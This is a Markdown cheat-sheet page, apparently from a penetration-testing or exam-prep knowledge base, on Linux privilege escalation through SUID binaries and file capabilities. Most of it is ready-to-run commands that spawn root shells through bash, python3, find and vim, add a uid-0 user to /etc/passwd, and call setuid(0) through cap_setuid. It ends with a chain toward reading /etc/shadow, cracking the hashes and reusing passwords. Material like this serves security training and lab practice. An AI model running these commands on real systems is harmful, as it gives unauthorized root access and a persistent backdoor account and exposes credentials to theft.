---
id: linux-suid-caps
title: Linux SUID / Capabilities
stage: privesc
tags: [linux]
summary: Find binaries with the SUID bit or elevated capabilities — both allow code execution at a higher privilege level without sudo, and GTFOBins covers most cases.
leads_to:
  - root-linux
---

## Prerequisites

A low-privilege shell. `find` available to enumerate SUID binaries. `getcap` available (or equivalent) for capabilities. Any non-standard binary in the SUID list is a high-priority target.

SUID binaries run as their owner (often root) regardless of who executes them. Linux capabilities grant a subset of root privileges (e.g., reading raw sockets, setting UID) to specific binaries without full root. Both are commonly misonfigured in exam environments — always enumerate both in your post-foothold checklist.

## Quick Win

> Run both scans immediately and cross-reference every non-standard result against GTFOBins.

```bash
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

## SUID Exploitation

> Common exploitable SUID binaries — these should not be SUID but sometimes are.

```bash
# bash (if set SUID — rare but instant root)
/bin/bash -p

# python / python3
python3 -c 'import os; os.execl("/bin/sh","sh","-p")'

# find
find . -exec /bin/sh -p \; -quit

# cp (overwrite /etc/passwd to add root user)
openssl passwd -1 -salt abc password123
echo 'newroot:$1$abc$HASH:0:0:root:/root:/bin/bash' | tee -a /etc/passwd
su newroot

# vim
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

## Capability Exploitation

> `cap_setuid+ep` is the most abusable — directly sets UID to 0.

| Capability | What it allows |
|---|---|
| `cap_setuid+ep` | Set process UID to 0 → root |
| `cap_dac_read_search+ep` | Read any file, including `/etc/shadow` |
| `cap_net_raw+ep` | Packet sniffing on any interface |

```bash
# cap_setuid (path from getcap output — use the actual binary found)
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# vim with cap_setuid
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh")'
```

## Leads To

SUID or capability exploit → root shell → root-linux. `cp` with SUID → overwrite `/etc/passwd` → `su` as synthetic root user. `cap_dac_read_search` → read `/etc/shadow` → crack hashes offline → password reuse across network.
